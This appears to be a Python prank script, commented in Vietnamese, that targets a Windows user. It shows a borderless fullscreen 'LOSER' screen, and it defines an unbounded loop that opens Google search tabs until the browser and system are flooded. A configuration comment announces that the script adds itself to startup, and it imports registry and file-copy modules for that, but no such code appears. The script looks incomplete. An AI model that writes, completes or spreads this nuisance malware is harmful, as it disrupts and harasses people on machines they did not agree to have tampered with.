import tkinter as tk
import threading
import time
import webbrowser
import os
import shutil
import getpass
import winreg

# === CẤU HÌNH ===
URL = "https://www.google.com/search?q=loser"
AUTO_START = True   # Tự thêm vào startup sau khi chạy

# === MÀN HÌNH FULL CHỮ LOSER ===
def show_fullscreen_loser():
    win = tk.Tk()
    win.attributes('-fullscreen', True)
    win.configure(bg='black')
    win.overrideredirect(True)

    label = tk.Label(
        win,
        text="LOSER",
        font=("Arial", 150, "bold"),
        fg="red",
        bg="black"
    )
    label.pack(expand=True)

    # Thoát bằng ESC + Tự thoát sau 15 giây
    win.bind("<Escape>", lambda e: win.destroy())
    win.after(15000, win.destroy)
    win.mainloop()

# === SPAM TAB TRÌNH DUYỆT ===
def open_browser_tabs():
    count = 0
    while True:
        webbrowser.open(URL)
        count += 1

# === MAIN CHƯƠNG TRÌNH ===
if __name__ == "__main__":
    if AUTO_START:
        show_fullscreen_loser()